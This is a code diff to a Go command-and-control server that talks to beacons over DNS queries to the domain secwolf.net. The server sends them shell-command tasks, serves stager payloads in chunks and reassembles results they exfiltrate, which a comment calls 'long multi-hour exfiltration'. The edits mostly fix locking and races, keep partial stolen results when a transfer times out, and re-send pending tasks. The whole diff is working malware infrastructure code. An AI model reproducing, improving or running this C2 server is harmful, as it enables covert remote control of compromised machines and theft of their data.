@@ -21,14 +21,15 @@ import (
 
 // Beacon represents a connected beacon client
 type Beacon struct {
-	ID        string    `json:"id"`
-	Hostname  string    `json:"hostname"`
-	Username  string    `json:"username"`
-	OS        string    `json:"os"`
-	Arch      string    `json:"arch"`
-	LastSeen  time.Time `json:"last_seen"`
-	IPAddress string    `json:"ip_address"`
-	TaskQueue []Task    `json:"-"` // Don't serialize tasks
+	ID          string    `json:"id"`
+	Hostname    string    `json:"hostname"`
+	Username    string    `json:"username"`
+	OS          string    `json:"os"`
+	Arch        string    `json:"arch"`
+	LastSeen    time.Time `json:"last_seen"`
+	IPAddress   string    `json:"ip_address"`
+	TaskQueue   []Task    `json:"-"` // Don't serialize tasks
+	CurrentTask string    `json:"-"` // ID of task currently assigned (not yet completed)
 }
 
 // Task represents a command task for a beacon
@@ -191,6 +192,11 @@ func (c2 *C2Manager) loadTasksFromDB() error {
 		if task.Status == "pending" {
 			if beacon, exists := c2.beacons[task.BeaconID]; exists {
 				beacon.TaskQueue = append(beacon.TaskQueue, *task)
+			}
+		} else if task.Status == "sent" {
+			// Restore "sent" tasks as current task (beacon may have crashed before completing)
+			if beacon, exists := c2.beacons[task.BeaconID]; exists {
+				beacon.CurrentTask = task.ID
 			}
 		}
 	}
@@ -402,34 +408,6 @@ func formatDuration(d time.Duration) string {
 	}
 }
 
-// renderTaskResultProgress creates a simple progress bar for task result chunks
-func renderTaskResultProgress(received, total int, taskID string) string {
-	if total == 0 {
-		return ""
-	}
-
-	percentage := float64(received) / float64(total) * 100
-	barWidth := 30
-	filled := int(float64(barWidth) * float64(received) / float64(total))
-
-	// Build progress bar
-	bar := "["
-	for i := 0; i < barWidth; i++ {
-		if i < filled {
-			bar += "="
-		} else if i == filled && filled < barWidth {
-			bar += ">"
-		} else {
-			bar += " "
-		}
-	}
-	bar += "]"
-
-	// Format: [========>     ] 45% (9/20 chunks) - T0001
-	return fmt.Sprintf("\r[Task %s] %s %.0f%% (%d/%d chunks)",
-		taskID, bar, percentage, received, total)
-}
-
 // cleanupExpiredSessions periodically removes expired stager sessions and expected results
 func (c2 *C2Manager) cleanupExpiredSessions() {
 	ticker := time.NewTicker(CleanupInterval)
@@ -458,13 +436,44 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 			}
 		}
 
-		// Clean up expired expected results
+		// Clean up expired expected results, but save partial results first
 		for taskID, expected := range c2.expectedResults {
 			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
-				delete(c2.expectedResults, taskID)
-				if c2.debug {
-					logf("[C2] Cleaned up expired expected result for task %s", taskID)
+				// Count received chunks
+				receivedCount := 0
+				for i := 0; i < expected.TotalChunks; i++ {
+					if expected.ReceivedData[i] != "" {
+						receivedCount++
+					}
 				}
+				
+				// If we have partial data, save it before cleanup
+				if receivedCount > 0 && c2.db != nil {
+					partialResult := strings.Join(expected.ReceivedData, "")
+					logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
+						taskID, receivedCount, expected.TotalChunks, len(partialResult))
+					
+					// Update task status and save partial result
+					if task, exists := c2.tasks[taskID]; exists {
+						task.Result = partialResult
+						task.Status = "partial"
+						
+						// Save to database asynchronously
+						go func(tid, bid, res string, recv, total int) {
+							if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
+								logf("[C2] Failed to save partial result: %v", err)
+							}
+							// Mark as partial in database
+							if err := c2.db.UpdateTaskStatus(tid, "partial"); err != nil && c2.debug {
+								logf("[C2] Failed to update task status: %v", err)
+							}
+						}(taskID, expected.BeaconID, partialResult, receivedCount, expected.TotalChunks)
+					}
+				} else if c2.debug {
+					logf("[C2] Cleaned up expired expected result for task %s (no data received)", taskID)
+				}
+				
+				delete(c2.expectedResults, taskID)
 			}
 		}
 
@@ -597,8 +606,8 @@ func looksLikeBase36(s string) bool {
 
 // processBeaconQuery processes a DNS query from a beacon and returns appropriate response
 func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
-	c2.mutex.Lock()
-	defer c2.mutex.Unlock()
+	// NOTE: No mutex lock here - individual handler functions manage their own locks
+	// to prevent deadlock when handlers call other functions that also need locks
 
 	// Quick filter: only process queries to secwolf.net
 	if !strings.HasSuffix(qname, "secwolf.net") {
@@ -735,14 +744,18 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	// Check for duplicate messages (DNS retries) - hash the content
 	msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
 	isDuplicate := false
+
+	c2.mutex.Lock()
 	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
 		isDuplicate = true
+		c2.mutex.Unlock()
 		if c2.debug {
 			logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
 		}
 	} else {
 		// Mark new message as seen
 		c2.recentMessages[msgHash] = time.Now()
+		c2.mutex.Unlock()
 	}
 
 	messageType := strings.SplitN(decoded, "|", 2)[0]
@@ -819,7 +832,8 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	os := parts[4]
 	arch := "unknown" // Architecture removed from client data
 
-	// Update or create beacon
+	// Update or create beacon (with mutex protection)
+	c2.mutex.Lock()
 	beacon, exists := c2.beacons[beaconID]
 	if !exists {
 		beacon = &Beacon{
@@ -827,11 +841,15 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			TaskQueue: []Task{},
 		}
 		c2.beacons[beaconID] = beacon
+		c2.mutex.Unlock()
 		// Always log new beacon registration (even if duplicate DNS query)
 		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
+	} else {
+		c2.mutex.Unlock()
 	}
 
-	// Update beacon info
+	// Update beacon info (re-acquire lock for modification)
+	c2.mutex.Lock()
 	beacon.Hostname = hostname
 	beacon.Username = username
 	beacon.OS = os
@@ -839,13 +857,25 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	beacon.LastSeen = time.Now()
 	beacon.IPAddress = clientIP
 
+	// Create a copy for async DB save (to avoid race conditions)
+	beaconCopy := &Beacon{
+		ID:        beacon.ID,
+		Hostname:  beacon.Hostname,
+		Username:  beacon.Username,
+		OS:        beacon.OS,
+		Arch:      beacon.Arch,
+		LastSeen:  beacon.LastSeen,
+		IPAddress: beacon.IPAddress,
+	}
+	c2.mutex.Unlock()
+
 	// Save beacon to database (async to avoid blocking)
 	if c2.db != nil && !isDuplicate {
 		go func(b *Beacon) {
 			if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
 				logf("[C2] Failed to save beacon to database: %v", err)
 			}
-		}(beacon)
+		}(beaconCopy)
 	}
 
 	// Only log checkins in debug mode and skip duplicates
@@ -854,31 +884,62 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			beaconID, username, hostname, clientIP)
 	}
 
-	// Check if there are pending tasks for this beacon
+	// Check if there are pending tasks for this beacon (with mutex protection)
+	c2.mutex.Lock()
+	
+	// If beacon has a current task assigned, check if it's been completed or failed
+	if beacon.CurrentTask != "" {
+		if task, exists := c2.tasks[beacon.CurrentTask]; exists {
+			// If task is completed/failed/partial, clear it and allow next task
+			if task.Status == "completed" || task.Status == "failed" || task.Status == "partial" {
+				beacon.CurrentTask = ""
+			} else {
+				// Task still pending/sent - resend the same task (idempotent)
+				// This handles duplicate check-ins or retries
+				c2.mutex.Unlock()
+				taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
+				if c2.debug && !isDuplicate {
+					logf("[DEBUG] Re-sending current task %s to %s", task.ID, beaconID)
+				}
+				return taskResponse
+			}
+		} else {
+			// Task doesn't exist anymore, clear it
+			beacon.CurrentTask = ""
+		}
+	}
+	
+	// Now check for next task in queue
 	if len(beacon.TaskQueue) > 0 {
 		task := beacon.TaskQueue[0]
-		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove the task from queue
+		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove from queue
+		beacon.CurrentTask = task.ID            // Mark as current task
 
 		// Mark task as sent
 		if storedTask, exists := c2.tasks[task.ID]; exists {
 			storedTask.Status = "sent"
 			now := time.Now()
 			storedTask.SentAt = &now
+		}
+		c2.mutex.Unlock()
 
-			// Update task status in database (async)
-			if c2.db != nil {
-				go func(tid string) {
-					if err := c2.db.UpdateTaskStatus(tid, "sent"); err != nil && c2.debug {
-						logf("[C2] Failed to update task status in database: %v", err)
-					}
-				}(task.ID)
-			}
+		// Update task status in database (async, outside lock)
+		if c2.db != nil {
+			go func(tid string) {
+				if err := c2.db.UpdateTaskStatus(tid, "sent"); err != nil && c2.debug {
+					logf("[C2] Failed to update task status in database: %v", err)
+				}
+			}(task.ID)
 		}
 
 		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
 		logf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
+		if c2.debug {
+			logf("[DEBUG] Returning task response: %s", taskResponse)
+		}
 		return taskResponse
 	}
+	c2.mutex.Unlock()
 
 	return "ACK" // No tasks available
 }
@@ -886,6 +947,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 // handleResult processes a command result from a beacon
 func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	if len(parts) < 4 {
+		logf("[C2] ERROR: handleResult received incomplete parts: %d", len(parts))
 		return "ERROR"
 	}
 
@@ -908,11 +970,28 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	if exists {
 		task.Result = result
 		task.Status = "completed"
+		if c2.debug && !isDuplicate {
+			logf("[DEBUG] Updated task %s: status=completed, result_len=%d", taskID, len(result))
+		}
+	} else {
+		c2.mutex.Unlock()
+		if c2.debug && !isDuplicate {
+			logf("[DEBUG] WARNING: Task %s not found in memory for result update", taskID)
+		}
+		// Still try to save to DB even if not in memory
+		if c2.db != nil {
+			go func(tid, bid, res string) {
+				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil {
+					logf("[C2] Failed to save orphan task result to database: %v", err)
+				}
+			}(taskID, beaconID, result)
+		}
+		return "ACK"
 	}
 	c2.mutex.Unlock()
 
-	// Save result to database (async) - do this even if task not in memory
-	if c2.db != nil && exists {
+	// Save result to database (async)
+	if c2.db != nil {
 		go func(tid, bid, res string) {
 			if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
 				logf("[C2] Failed to save task result to database: %v", err)
@@ -999,7 +1078,7 @@ func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
 			beaconID, taskID, totalSize, totalChunks)
 	}
 
-	// Store the expectation
+	// Store the expectation (with mutex protection)
 	expected := &ExpectedResult{
 		BeaconID:     beaconID,
 		TaskID:       taskID,
@@ -1009,7 +1088,10 @@ func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
 		ReceivedData: make([]string, totalChunks),
 	}
 
+	c2.mutex.Lock()
 	c2.expectedResults[taskID] = expected
+	c2.mutex.Unlock()
+
 	return "ACK"
 }
 
@@ -1024,11 +1106,15 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	chunkIndex, _ := strconv.Atoi(parts[3])
 	data := parts[4]
 
-	// Check if we're expecting this data
+	// Check if we're expecting this data (read lock only)
+	c2.mutex.RLock()
 	expected, exists := c2.expectedResults[taskID]
 	if !exists {
 		// Check if task already completed (duplicate chunk after completion)
-		if task, taskExists := c2.tasks[taskID]; taskExists && task.Status == "completed" {
+		task, taskExists := c2.tasks[taskID]
+		c2.mutex.RUnlock()
+
+		if taskExists && task.Status == "completed" {
 			// Task already completed, this is a duplicate chunk - silently ACK
 			if c2.debug {
 				logf("[DEBUG] Received duplicate DATA chunk for completed task %s", taskID)
@@ -1041,21 +1127,26 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		}
 		return "ERROR"
 	}
+	c2.mutex.RUnlock()
 
-	// Store the chunk (1-indexed from client, 0-indexed in array)
+	// Store the chunk (write lock only for the update)
+	c2.mutex.Lock()
 	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
 		// Only update if this is a new chunk (not a duplicate)
 		if expected.ReceivedData[chunkIndex-1] == "" {
 			expected.ReceivedData[chunkIndex-1] = data
 			expected.LastChunkIndex = chunkIndex
+			// Update timestamp to prevent timeout during long multi-hour exfiltration
+			expected.ReceivedAt = time.Now()
 		}
 	} else {
+		c2.mutex.Unlock()
 		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
 			chunkIndex, taskID, expected.TotalChunks)
 		return "ERROR"
 	}
 
-	// Check if we have all chunks
+	// Check if we have all chunks (still under write lock)
 	complete := true
 	receivedCount := 0
 	for i := 0; i < expected.TotalChunks; i++ {
@@ -1066,29 +1157,34 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		}
 	}
 
-	// Silent background chunk assembly - progress only shown when 'tasks' command is run
-	// No console output here to avoid blocking console for other beacon operations
+	// Log progress for large results (every 10 chunks or completion)
+	if !isDuplicate && (receivedCount%10 == 0 || complete) {
+		logf("[C2] Progress: %d/%d chunks received for %s (task %s)", 
+			receivedCount, expected.TotalChunks, beaconID, taskID)
+	}
 
 	if complete {
-		// Reconstruct the complete result
+		// Reconstruct the complete result (still under lock, fast operation)
 		result := strings.Join(expected.ReceivedData, "")
 
-		// Only log if not a duplicate
-		if !isDuplicate {
-			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
-		}
-
-		// Update the task with mutex protection
-		c2.mutex.Lock()
-		task, exists := c2.tasks[taskID]
-		if exists {
+		// Update the task
+		task, taskExists := c2.tasks[taskID]
+		if taskExists {
 			task.Result = result
 			task.Status = "completed"
 		}
+
+		// Clean up
+		delete(c2.expectedResults, taskID)
 		c2.mutex.Unlock()
 
-		// Save result to database (async) - do this even if task not in memory
-		if c2.db != nil && exists {
+		// Log and save to database (outside lock)
+		if !isDuplicate {
+			logf("[C2] Result complete: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
+		}
+
+		// Save result to database (async, outside lock)
+		if c2.db != nil && taskExists {
 			go func(tid, bid, res string, chunks int) {
 				// Save the complete result
 				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
@@ -1100,9 +1196,8 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 				}
 			}(taskID, beaconID, result, expected.TotalChunks)
 		}
-
-		// Clean up
-		delete(c2.expectedResults, taskID)
+	} else {
+		c2.mutex.Unlock()
 	}
 
 	return "ACK"
@@ -1225,7 +1320,10 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		CreatedAt:    time.Now(),
 		LastActivity: time.Now(), // Initialize activity timestamp
 	}
+
+	c2.mutex.Lock()
 	c2.stagerSessions[stagerIP] = session // Key by stager's actual IP
+	c2.mutex.Unlock()
 
 	// Return metadata
 	return fmt.Sprintf("META|%d", len(chunks))
@@ -1249,7 +1347,10 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	stagerIP := parts[2] // Extract stager's actual IP from ACK message
 
 	// Look up the stager session using stager's actual IP (not DNS resolver IP)
+	c2.mutex.RLock()
 	session, exists := c2.stagerSessions[stagerIP]
+	c2.mutex.RUnlock()
+
 	if !exists {
 		if !isDuplicate {
 			logf("[C2] No stager session found for stager IP %s (DNS resolver: %s)", stagerIP, clientIP)
@@ -1258,6 +1359,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	}
 
 	// Update last activity timestamp to keep session alive during active downloads
+	c2.mutex.Lock()
 	now := time.Now()
 	session.LastActivity = now
 
@@ -1265,6 +1367,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	if chunkIndex == 0 && session.StartedAt.IsZero() {
 		session.StartedAt = now
 	}
+	c2.mutex.Unlock()
 
 	// Validate chunk index
 	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
@@ -1280,12 +1383,16 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 
 	if !isDuplicate {
 		// Only update progress bar if this is a NEW chunk (different from last one)
+		c2.mutex.Lock()
 		if session.LastChunk == nil || *session.LastChunk != chunkIndex {
 			// Update last chunk sent
 			session.LastChunk = &chunkIndex
+			c2.mutex.Unlock()
 
-			// Display progress bar instead of individual log lines
+			// Display progress bar instead of individual log lines (outside lock)
 			c2.logStagerProgress(session, chunkIndex, stagerIP)
+		} else {
+			c2.mutex.Unlock()
 		}
 	}
 
